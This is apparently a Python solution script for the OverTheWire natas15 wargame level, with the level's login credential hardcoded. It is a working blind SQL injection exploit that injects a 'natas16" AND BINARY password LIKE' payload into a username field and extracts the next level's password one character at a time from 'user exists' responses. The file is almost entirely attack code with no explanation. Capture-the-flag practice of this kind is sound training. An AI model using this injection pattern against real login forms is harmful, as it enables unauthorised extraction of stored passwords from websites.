import requests
import re
import string


characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

print(characters)

username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
#custom_headers = {"Referer":"http://natas5.natas.labs.overthewire.org/"}
url = "http://%s.natas.labs.overthewire.org/" % username

session = requests.Session()

seen_password = ""

while len(seen_password) < len(password):
	for ch in characters:
		
		print("trying with " + seen_password + ch)
		response = session.post(url, data= {"username" : 'natas16" AND BINARY password LIKE "' + seen_password+ ch +  '%"#'}, auth = (username, password))

		if("user exists" in response.text):
			seen_password+=ch
			break;

print(seen_password)

